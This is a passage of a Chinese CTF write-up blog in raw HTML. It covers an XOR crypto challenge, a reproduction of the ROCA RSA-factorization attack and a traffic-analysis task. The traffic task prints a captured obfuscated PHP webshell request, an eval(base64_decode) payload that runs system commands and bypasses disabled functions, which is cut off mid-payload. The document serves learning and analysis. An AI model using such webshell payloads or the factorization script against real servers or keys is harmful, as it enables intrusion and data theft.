class="line">        <span class="built_in">print</span>(<span class="string">&#x27;k:&#x27;</span>, h)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ h))</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x6e64696f735f3b396b67453b574b38653b573f67576e3c5c3b6b7c6e75</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">第29个字符</span></span><br><span class="line"><span class="string">k: 1</span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 2</span></span><br><span class="line"><span class="string">w</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 3</span></span><br><span class="line"><span class="string">v</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 4</span></span><br><span class="line"><span class="string">q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 5</span></span><br><span class="line"><span class="string">p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 6</span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 7</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 8</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 9</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># k = 8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>异或</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">&#x27;ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">8</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;W31coM3_C0m3_7o_f4T3ctf&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="CVE-OF-RSA-赛后复现"><a href="#CVE-OF-RSA-赛后复现" class="headerlink" title="CVE OF RSA | 赛后复现"></a>CVE OF RSA | 赛后复现</h3><blockquote>
<p>此题是赛后看了<a target="_blank" rel="noopener" href="https://4xwi11.github.io/posts/9171e9d7/">4xwi11师傅</a>的思路后，尝试独立复现的</p>
</blockquote>
<p>回顾当时的情形，比赛时间为10: 00 - 18:00</p>
<p>十二点到下午一点之间就已经完成了2/3的密码题了</p>
<p>于是充满干劲地去试此题（<strong>AK是梦想哈哈🤤</strong></p>
<p><strong>列出几点不足</strong></p>
<ul>
<li><p>知识面窄，不晓得此漏洞</p>
</li>
<li><p>反应慢半拍，以为要嗯研究数学逻辑，然后独立写脚本</p>
<p>就这样想了两三个小时，期间疯狂搜索，也没思路</p>
</li>
<li><p>思维僵硬，终于找到CVE对应的paper后，没有想到可以去找已有的、现成的代码</p>
<p>（其实时间也不够了，五点四十几，看到论文就瞑目了，时间太紧没有干劲啃论文了</p>
</li>
</ul>
<p>好，让我们回到五点四十。</p>
<ol>
<li><p>搜到了如下关键词</p>
<p><a target="_blank" rel="noopener" href="https://crocs.fi.muni.cz/_media/public/papers/nemec_roca_ccs17_preprint.pdf"><strong>The Return of Coppersmith’s Attack</strong></a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220425230421404.png" alt="paper"></p>
</li>
<li><p>此时，不该去望“文”兴叹，去<strong>github搜索</strong>看看吧！</p>
<p>直接搜索关键词，没有高质量的代码</p>
<p>参考4xwi11师傅推荐的仓库</p>
<blockquote>
<p>17年的<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ROCA_vulnerability">ROCA（Return of Coppersmith’s attack）漏洞</a>。简单转述一下就是，一些硬件采用以上方法快速产生RSA的私钥，这样产生的公钥n会带有一个指纹，但由于M是光滑数，这个指纹可以很快被攻击者确定，从而分解n</p>
<p>有个仓库总结了很多密码的攻击，其中就有ROCA，Fr.<a target="_blank" rel="noopener" href="https://github.com/jvdsn/crypto-attacks.git">https://github.com/jvdsn/crypto-attacks.git</a></p>
</blockquote>
</li>
<li><p>利用其中函数，在roca.py下添加(N从靶机中得来)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">M = <span class="number">962947420735983927056946215901134429196419130606213075415963491270</span></span><br><span class="line">N = <span class="number">14481363580917358871472996410471767154481047067466167591298208947805462002275531552979475988627964256677709787930755013972295770123571982960720640872341517</span></span><br><span class="line">p_, q_ = factorize(N, M, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found p = <span class="subst">&#123;p_&#125;</span> and q = <span class="subst">&#123;q_&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>其中m = 5, t= 6来源如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># roca.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorize</span>(<span class="params">N, M, m, t, g=<span class="number">65537</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus using the ROCA method.</span></span><br><span class="line"><span class="string">    More information: Nemec M. et al., &quot;The Return of Coppersmith’s Attack: Practical Factorization of Widely Used RSA Moduli&quot;</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param M: the primorial used to generate the primes</span></span><br><span class="line"><span class="string">    :param m: the m parameter for Coppersmith&#x27;s method</span></span><br><span class="line"><span class="string">    :param t: the t parameter for Coppersmith&#x27;s method</span></span><br><span class="line"><span class="string">    :param g: the generator value (default: 65537)</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ···</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数根据论文<em>The Return of Coppersmith’s Attack: Practical Factorization of Widely Used RSA Moduli</em>(<a target="_blank" rel="noopener" href="https://acmccs.github.io/papers/p1631-nemecA.pdf)%EF%BC%8Cn%E6%98%AF512%E4%BD%8D%E7%9A%84%EF%BC%8C%E5%88%99m%E5%92%8Ct%E5%88%86%E5%88%AB%E5%8F%965%E5%92%8C6">https://acmccs.github.io/papers/p1631-nemecA.pdf)，n是512位的，则m和t分别取5和6</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220426002438607.png" alt="m&amp;t"></p>
</blockquote>
</li>
<li><p>利用sage解题「 Linux or (类)Unix 终端 」</p>
<ul>
<li><p>激活sage <code>conda activate sage</code> </p>
</li>
<li><p>执行roca解题脚本 <code>sage -python roca.py的绝对路径</code> </p>
</li>
<li><p>等待⌛️ 五分钟左右，分解成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220426002311486.png" alt="roca"></p>
</li>
<li><p>正常RSA求解m</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">n = <span class="number">14481363580917358871472996410471767154481047067466167591298208947805462002275531552979475988627964256677709787930755013972295770123571982960720640872341517</span></span><br><span class="line">c = <span class="number">3679892564888936950542940140902963743841717939818025696558626052971555790204073416047068709668040686939721666022034628127241497612925260505783618939964139</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">111425929610175462966231922510304239063491575573222700849341403103622849511679</span></span><br><span class="line">q = <span class="number">129964036482177256444505240482938730532498372430648951070700710194345995195123</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># flag&#123;e28e6991-080d-4587-900d-db3c47139453&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h4><ul>
<li>找到了厉害师傅的博客🤔</li>
<li>第一次体验了CVE复现</li>
<li>近一步了解密码解题的思维</li>
<li>发现了一个极好的Crypto-attack仓库</li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>略</p>
<h3 id="easyflow"><a href="#easyflow" class="headerlink" title="easyflow"></a>easyflow</h3><p>先用wireshark把所有HTTP流量都导出<br><img src="https://s2.loli.net/2022/04/23/FMmAZp8UeS2Nunq.png" alt="upload_eea1e678ff86ee76ae1563aab3d03593.png"></p>
<p>大致分析了一下<br>在第11个包开始发现异常</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">93748</span>ef4./	<span class="number">2022-04-05</span> <span class="number">20:30:07	128</span>	<span class="number">0700</span></span><br><span class="line">../	<span class="number">2022-04-05</span> <span class="number">20</span>:<span class="number">30:05	384</span>	<span class="number">0700</span></span><br><span class="line">.DS_Store	<span class="number">2022-04-05</span> <span class="number">20</span>:<span class="number">30:12	6148</span>	<span class="number">0644</span></span><br><span class="line">index.php	<span class="number">2022-04-05</span> <span class="number">20:11:46	34</span>	<span class="number">0666</span></span><br><span class="line"><span class="number">3f17a75c06</span></span><br></pre></td></tr></table></figure>

<p>第13个包发现了flag.txt</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">4304dd6cf6d./</span>	<span class="number">2022-04-05 20:30:05	</span><span class="number">384</span>	<span class="number">0700</span></span><br><span class="line"><span class="string">../</span>	<span class="number">2022-04-05 20:29:55	</span><span class="number">3424	</span><span class="number">0755</span></span><br><span class="line"><span class="string">mess/</span>	<span class="number">2022-03-15 18:13:29	</span><span class="number">384</span>	<span class="number">0755</span></span><br><span class="line"><span class="string">test/</span>	<span class="number">2022-04-05 20:30:07	</span><span class="number">128</span>	<span class="number">0700</span></span><br><span class="line"><span class="string">air/</span>	<span class="number">2022-03-31 10:42:34	</span><span class="number">512</span>	<span class="number">0700</span></span><br><span class="line"><span class="string">rips/</span>	<span class="number">2022-02-25 09:16:57	</span><span class="number">384</span>	<span class="number">0775</span></span><br><span class="line"><span class="string">CMS/</span>	<span class="number">2022-01-20 09:29:06	</span><span class="number">384</span>	<span class="number">0755</span></span><br><span class="line"><span class="string">test4/</span>	<span class="number">2022-03-31 17:33:39	</span><span class="number">384</span>	<span class="number">0700</span></span><br><span class="line"><span class="string">localhost/</span>	<span class="number">2022-04-04 17:21:59	</span><span class="number">640</span>	<span class="number">0775</span></span><br><span class="line"><span class="string">.DS_Store</span>	<span class="number">2022-04-05 20:30:07	</span><span class="number">8196	</span><span class="number">0644</span></span><br><span class="line"><span class="string">flag.txt</span>	<span class="number">2022-04-05 20:14:30	</span><span class="number">84</span>	<span class="number">0644</span></span><br><span class="line"><span class="string">Mccms_v2.5.7.zip</span>	<span class="number">2022-03-31 15:11:18	</span><span class="number">12986995</span>	<span class="number">0644</span></span><br><span class="line"><span class="string">8197fe18fb2b</span></span><br></pre></td></tr></table></figure>

<p>然后在第17个包和第19个包发现了关于flag的线索<br>17</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f9aa250head: illegal line <span class="keyword">count</span> -- ../flag.txt</span><br><span class="line">[S]</span><br><span class="line"><span class="regexp">/Users/</span>chang<span class="regexp">/Sites/</span>test</span><br><span class="line">[E]</span><br><span class="line"><span class="number">13</span>e3b9</span><br></pre></td></tr></table></figure>

<p>19</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">625</span>fe869b49eYes,<span class="keyword">this</span> is the flag <span class="keyword">file</span>.</span><br><span class="line">And the flag is:</span><br><span class="line">[S]</span><br><span class="line"><span class="regexp">/Users/</span>chang<span class="regexp">/Sites/</span>test</span><br><span class="line">[E]</span><br><span class="line"><span class="number">63</span>c1dbf1e811</span><br></pre></td></tr></table></figure>


<p>于是开始分析第16个包的内容</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=%<span class="number">40</span>eval(%<span class="number">40</span>base<span class="number">64</span>_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B&#x27;kc<span class="number">1</span>b<span class="number">01</span>ee<span class="number">4</span>a<span class="number">605</span>&#x27;%<span class="number">5</span>D))%<span class="number">3</span>B&amp;e<span class="number">57</span>fb<span class="number">9</span>c<span class="number">067</span>c<span class="number">677</span>=E<span class="number">8</span>&amp;g<span class="number">479</span>cf<span class="number">6</span>f<span class="number">058</span>cf<span class="number">8</span>=hnY<span class="number">2</span>QgIi<span class="number">9</span>Vc<span class="number">2</span>Vycy<span class="number">9</span>jaGFuZy<span class="number">9</span>TaXRlcy<span class="number">90</span>ZXN<span class="number">0</span>IjtoZWFkIC<span class="number">1</span>uIC<span class="number">4</span>uL<span class="number">2</span>ZsYWcudHh<span class="number">0</span>O<span class="number">2</span>VjaG<span class="number">8</span>gW<span class="number">1</span>NdO<span class="number">3</span>B<span class="number">3</span>ZDtlY<span class="number">2</span>hvIFtFXQ%<span class="number">3</span>D%<span class="number">3</span>D&amp;kc<span class="number">1</span>b<span class="number">01</span>ee<span class="number">4</span>a<span class="number">605</span>=QGluaV<span class="number">9</span>zZXQoImRpc<span class="number">3</span>BsYXlfZXJyb<span class="number">3</span>JzIiwgIjAiKTtAc<span class="number">2</span>V<span class="number">0</span>X<span class="number">3</span>RpbWVfbGltaXQoMCk<span class="number">7</span>ZnVuY<span class="number">3</span>Rpb<span class="number">24</span>gYXNlbmMoJG<span class="number">91</span>dCl<span class="number">7</span>cmV<span class="number">0</span>dXJuICRvdXQ<span class="number">7</span>fTtmdW<span class="number">5</span>jdGlvbiBhc<span class="number">291</span>dHB<span class="number">1</span>dCgpeyRvdXRwdXQ<span class="number">9</span>b<span class="number">2</span>JfZ<span class="number">2</span>V<span class="number">0</span>X<span class="number">2</span>NvbnRlbnRzKCk<span class="number">7</span>b<span class="number">2</span>JfZW<span class="number">5</span>kX<span class="number">2</span>NsZWFuKCk<span class="number">7</span>ZWNobyAiZjlhIi<span class="number">4</span>iYTI<span class="number">1</span>MCI<span class="number">7</span>ZWNobyBAYXNlbmMoJG<span class="number">91</span>dHB<span class="number">1</span>dCk<span class="number">7</span>ZWNobyAiMTNlIi<span class="number">4</span>iM<span class="number">2</span>I<span class="number">5</span>Ijt<span class="number">9</span>b<span class="number">2</span>Jfc<span class="number">3</span>RhcnQoKTt<span class="number">0</span>cnl<span class="number">7</span>JHA<span class="number">9</span>YmFzZTY<span class="number">0</span>X<span class="number">2</span>RlY<span class="number">29</span>kZShzdWJzdHIoJF<span class="number">9</span>QT<span class="number">1</span>NUWyJvMWZhZWJkNGVjM<span class="number">2</span>Q<span class="number">5</span>NyJdLDIpKTskcz<span class="number">1</span>iYXNlNjRfZGVjb<span class="number">2</span>RlKHN<span class="number">1</span>YnN<span class="number">0</span>cigkX<span class="number">1</span>BPU<span class="number">1</span>RbImc<span class="number">0</span>NzljZjZmMDU<span class="number">4</span>Y<span class="number">2</span>Y<span class="number">4</span>Il<span class="number">0</span>sMikpOyRlbnZzdHI<span class="number">9</span>QGJhc<span class="number">2</span>U<span class="number">2</span>NF<span class="number">9</span>kZWNvZGUoc<span class="number">3</span>Vic<span class="number">3</span>RyKCRfUE<span class="number">9</span>TVFsiZTU<span class="number">3</span>ZmI<span class="number">5</span>YzA<span class="number">2</span>N<span class="number">2</span>M<span class="number">2</span>NzciXSwyKSk<span class="number">7</span>JGQ<span class="number">9</span>ZGlybmFtZSgkX<span class="number">1</span>NFUlZFUlsiU<span class="number">0</span>NSSVBUX<span class="number">0</span>ZJTEVOQU<span class="number">1</span>FIl<span class="number">0</span>pOyRjPXN<span class="number">1</span>YnN<span class="number">0</span>cigkZCwwLDEpPT<span class="number">0</span>iLyI%<span class="number">2</span>FIi<span class="number">1</span>jIFwieyRzfVwiIjoiL<span class="number">2</span>MgXCJ<span class="number">7</span>JHN<span class="number">9</span>XCIiO<span class="number">2</span>lmKHN<span class="number">1</span>YnN<span class="number">0</span>cigkZCwwLDEpPT<span class="number">0</span>iLyIpe<span class="number">0</span>BwdXRlbnYoIlBBVEg<span class="number">9</span>Ii<span class="number">5</span>nZXRlbnYoIlBBVEgiKS<span class="number">4</span>iOi<span class="number">91</span>c<span class="number">3</span>IvbG<span class="number">9</span>jYWwvc<span class="number">2</span>JpbjovdXNyL<span class="number">2</span>xvY<span class="number">2</span>FsL<span class="number">2</span>JpbjovdXNyL<span class="number">3</span>NiaW<span class="number">46</span>L<span class="number">3</span>Vzci<span class="number">9</span>iaW<span class="number">46</span>L<span class="number">3</span>NiaW<span class="number">46</span>L<span class="number">2</span>JpbiIpO<span class="number">31</span>lbHNle<span class="number">0</span>BwdXRlbnYoIlBBVEg<span class="number">9</span>Ii<span class="number">5</span>nZXRlbnYoIlBBVEgiKS<span class="number">4</span>iO<span class="number">0</span>M<span class="number">6</span>L<span class="number">1</span>dpbmRvd<span class="number">3</span>Mvc<span class="number">3</span>lzdGVtMzI<span class="number">7</span>QzovV<span class="number">2</span>luZG<span class="number">93</span>cy<span class="number">9</span>TeXNXT<span class="number">1</span>c<span class="number">2</span>NDtDOi<span class="number">9</span>XaW<span class="number">5</span>kb<span class="number">3</span>dzO<span class="number">0</span>M<span class="number">6</span>L<span class="number">1</span>dpbmRvd<span class="number">3</span>MvU<span class="number">3</span>lzdGVtMzIvV<span class="number">2</span>luZG<span class="number">93</span>c<span class="number">1</span>Bvd<span class="number">2</span>VyU<span class="number">2</span>hlbGwvdjEuMC<span class="number">87</span>Iik<span class="number">7</span>fWlmKCFlbXB<span class="number">0</span>eSgkZW<span class="number">52</span>c<span class="number">3</span>RyKSl<span class="number">7</span>JGVudmFycj<span class="number">1</span>leHBsb<span class="number">2</span>RlKCJ<span class="number">8</span>fHxhc<span class="number">2</span>xpbmV<span class="number">8</span>fHwiLCAkZW<span class="number">52</span>c<span class="number">3</span>RyKTtmb<span class="number">3</span>JlYWNoKCRlbnZhcnIgYXMgJHYpIHtpZiAoIWVtcHR<span class="number">5</span>KCR<span class="number">2</span>KSkge<span class="number">0</span>BwdXRlbnYoc<span class="number">3</span>RyX<span class="number">3</span>JlcGxhY<span class="number">2</span>UoInx<span class="number">8</span>fGFza<span class="number">2</span>V<span class="number">5</span>fHx<span class="number">8</span>IiwgIj<span class="number">0</span>iLCAkdikpO<span class="number">319</span>fSRyPSJ<span class="number">7</span>JHB<span class="number">9</span>IHskY<span class="number">30</span>iO<span class="number">2</span>Z<span class="number">1</span>bmN<span class="number">0</span>aW<span class="number">9</span>uIGZlKCRmKXskZD<span class="number">1</span>leHBsb<span class="number">2</span>RlKCIsIixAaW<span class="number">5</span>pX<span class="number">2</span>dldCgiZGlzYWJsZV<span class="number">9</span>mdW<span class="number">5</span>jdGlvbnMiKSk<span class="number">7</span>aWYoZW<span class="number">1</span>wdHkoJGQpKXskZD<span class="number">1</span>hcnJheSgpO<span class="number">31</span>lbHNleyRkPWFycmF<span class="number">5</span>X<span class="number">21</span>hcCgndHJpbScsYXJyYXlfbWFwKCdzdHJ<span class="number">0</span>b<span class="number">2</span>xvd<span class="number">2</span>VyJywkZCkpO<span class="number">31</span>yZXR<span class="number">1</span>cm<span class="number">4</span>oZnVuY<span class="number">3</span>Rpb<span class="number">25</span>fZXhpc<span class="number">3</span>RzKCRmKSYmaXNfY<span class="number">2</span>FsbGFibGUoJGYpJiYhaW<span class="number">5</span>fYXJyYXkoJGYsJGQpKTt<span class="number">9</span>O<span class="number">2</span>Z<span class="number">1</span>bmN<span class="number">0</span>aW<span class="number">9</span>uIHJ<span class="number">1</span>bnNoZWxsc<span class="number">2</span>hvY<span class="number">2</span>soJGQsICRjKSB<span class="number">7</span>aWYgKHN<span class="number">1</span>YnN<span class="number">0</span>cigkZCwgMCwgMSkgPT<span class="number">0</span>gIi<span class="number">8</span>iICYmIGZlKCdwdXRlbnYnKSAmJiAoZmUoJ<span class="number">2</span>Vycm<span class="number">9</span>yX<span class="number">2</span>xvZycpIHx<span class="number">8</span>IGZlKCdtYWlsJykpKSB<span class="number">7</span>aWYgKHN<span class="number">0</span>cnN<span class="number">0</span>cihyZWFkbGluaygiL<span class="number">2</span>Jpbi<span class="number">9</span>zaCIpLCAiYmFzaCIpICE<span class="number">9</span>IEZBTFNFKSB<span class="number">7</span>JHRtcCA<span class="number">9</span>IHRlbXBuYW<span class="number">0</span>oc<span class="number">3</span>lzX<span class="number">2</span>dldF<span class="number">90</span>ZW<span class="number">1</span>wX<span class="number">2</span>RpcigpLCAnYXMnKTtwdXRlbnYoIlBIUF<span class="number">9</span>MT<span class="number">0</span>w<span class="number">9</span>KCkgeyB<span class="number">4</span>OyB<span class="number">9</span>OyAkYyA%<span class="number">2</span>BJHRtcCAyPiYxIik<span class="number">7</span>aWYgKGZlKCdlcnJvcl<span class="number">9</span>sb<span class="number">2</span>cnKSkge<span class="number">2</span>Vycm<span class="number">9</span>yX<span class="number">2</span>xvZygiYSIsIDEpO<span class="number">30</span>gZWxzZSB<span class="number">7</span>bWFpbCgiYUAxMjcuMC<span class="number">4</span>wLjEiLCAiIiwgIiIsICItYnYiKTt<span class="number">9</span>fSBlbHNlIHtyZXR<span class="number">1</span>cm<span class="number">4</span>gRmFsc<span class="number">2</span>U<span class="number">7</span>fSRvdXRwdXQgPSBAZmlsZV<span class="number">9</span>nZXRfY<span class="number">29</span>udGVudHMoJHRtcCk<span class="number">7</span>QHVubGluaygkdG<span class="number">1</span>wKTtpZiAoJG<span class="number">91</span>dHB<span class="number">1</span>dCAhPSAiIikge<span class="number">3</span>ByaW<span class="number">50</span>KCRvdXRwdXQpO<span class="number">3</span>JldHVybiBUcnVlO<span class="number">319</span>cmV<span class="number">0</span>dXJuIEZhbHNlO<span class="number">307</span>ZnVuY<span class="number">3</span>Rpb<span class="number">24</span>gcnVuY<span class="number">21</span>kKCRjKXskcmV<span class="number">0</span>PTA<span class="number">7</span>JGQ<span class="number">9</span>ZGlybmFtZSgkX<span class="number">1</span>NFUlZFUlsiU<span class="number">0</span>NSSVBUX<span class="number">0</span>ZJTEVOQU<span class="number">1</span>FIl<span class="number">0</span>pO<span class="number">2</span>lmKGZlKCdzeXN<span class="number">0</span>ZW<span class="number">0</span>nKSl<span class="number">7</span>QHN<span class="number">5</span>c<span class="number">3</span>RlbSgkYywkcmV<span class="number">0</span>KTt<span class="number">9</span>ZWxzZWlmKGZlKCdwYXNzdGhydScpKXtAcGFzc<span class="number">3</span>RocnUoJGMsJHJldCk<span class="number">7</span>fWVsc<span class="number">2</span>VpZihmZSgnc<span class="number">2</span>hlbGxfZXhlYycpKXtwcmludChAc<span class="number">2</span>hlbGxfZXhlYygkYykpO<span class="number">31</span>lbHNlaWYoZmUoJ<span class="number">2</span>V<span class="number">4</span>ZWMnKSl<span class="number">7</span>QGV<span class="number">4</span>ZWMoJGMsJG<span class="number">8</span>sJHJldCk<span class="number">7</span>cHJpbnQoam<span class="number">9</span>pbigiCiIsJG<span class="number">8</span>pKTt<span class="number">9</span>ZWxzZWlmKGZlKCdwb<span class="number">3</span>BlbicpKXskZnA<span class="number">9</span>QHBvcGVuKCRjLCdyJyk<span class="number">7</span>d<span class="number">2</span>hpbGUoIUBmZW<span class="number">9</span>mKCRmcCkpe<span class="number">3</span>ByaW<span class="number">50</span>KEBmZ<span class="number">2</span>V<span class="number">0</span>cygkZnAsMjA<span class="number">0</span>OCkpO<span class="number">31</span>AcGNsb<span class="number">3</span>NlKCRmcCk<span class="number">7</span>fWVsc<span class="number">2</span>VpZihmZSgncHJvY<span class="number">19</span>vcGVuJykpeyRwID<span class="number">0</span>gQHByb<span class="number">2</span>Nfb<span class="number">3</span>BlbigkYywgYXJyYXkoMSA<span class="number">9</span>PiBhcnJheSgncGlwZScsICd<span class="number">3</span>JyksIDIgPT<span class="number">4</span>gYXJyYXkoJ<span class="number">3</span>BpcGUnLCAndycpKSwgJGlvKTt<span class="number">3</span>aGlsZSghQGZlb<span class="number">2</span>YoJGlvWzFdKSl<span class="number">7</span>cHJpbnQoQGZnZXRzKCRpb<span class="number">1</span>sxXSwyMDQ<span class="number">4</span>KSk<span class="number">7</span>fXdoaWxlKCFAZmVvZigkaW<span class="number">9</span>bMl<span class="number">0</span>pKXtwcmludChAZmdldHMoJGlvWzJdLDIwNDgpKTt<span class="number">9</span>QGZjbG<span class="number">9</span>zZSgkaW<span class="number">9</span>bMV<span class="number">0</span>pO<span class="number">0</span>BmY<span class="number">2</span>xvc<span class="number">2</span>UoJGlvWzJdKTtAcHJvY<span class="number">19</span>jbG<span class="number">9</span>zZSgkcCk<span class="number">7</span>fWVsc<span class="number">2</span>VpZihmZSgnYW<span class="number">50</span>c<span class="number">3</span>lzdGVtJykpe<span class="number">0</span>BhbnRzeXN<span class="number">0</span>ZW<span class="number">0</span>oJGMpO<span class="number">31</span>lbHNlaWYocnVuc<span class="number">2</span>hlbGxzaG<span class="number">9</span>jaygkZCwgJGMpKSB<span class="number">7</span>cmV<span class="number">0</span>dXJuICRyZXQ<span class="number">7</span>fWVsc<span class="number">2</span>VpZihzdWJzdHIoJGQsMCwxKSE<span class="number">9</span>Ii<span class="number">8</span>iICYmIEBjbGFzc<span class="number">19</span>leGlzdHMoIkNPTSIpKXskdz<span class="number">1</span>uZXcgQ<span class="number">09</span>NKCdXU<span class="number">2</span>NyaXB<span class="number">0</span>LnNoZWxsJyk<span class="number">7</span>JGU<span class="number">9</span>JHctPmV<span class="number">4</span>ZWMoJGMpOyRzbz<span class="number">0</span>kZS<span class="number">0</span>%<span class="number">2</span>BU<span class="number">3</span>RkT<span class="number">3</span>V<span class="number">0</span>KCk<span class="number">7</span>JHJldC<span class="number">49</span>JHNvLT<span class="number">5</span>SZWFkQWxsKCk<span class="number">7</span>JHNlPSRlLT<span class="number">5</span>TdGRFcnIoKTskcmV<span class="number">0</span>Lj<span class="number">0</span>kc<span class="number">2</span>UtPlJlYWRBbGwoKTtwcmludCgkcmV<span class="number">0</span>KTt<span class="number">9</span>ZWxzZXskcmV<span class="number">0</span>ID<span class="number">0</span>gMTI<span class="number">3</span>O<span class="number">31</span>yZXR<span class="number">1</span>cm<span class="number">4</span>gJHJldDt<span class="number">9</span>OyRyZXQ<span class="number">9</span>QHJ<span class="number">1</span>bmNtZCgkci<span class="number">4</span>iIDI%<span class="number">2</span>BJjEiKTtwcmludCAoJHJldCE<span class="number">9</span>MCk%<span class="number">2</span>FInJldD<span class="number">17</span>JHJldH<span class="number">0</span>iOiIiOzt<span class="number">9</span>Y<span class="number">2</span>F<span class="number">0</span>Y<span class="number">2</span>goRXhjZXB<span class="number">0</span>aW<span class="number">9</span>uICRlKXtlY<span class="number">2</span>hvICJFUlJPUjovLyIuJGUtPmdldE<span class="number">1</span>lc<span class="number">3</span>NhZ<span class="number">2</span>UoKTt<span class="number">9</span>O<span 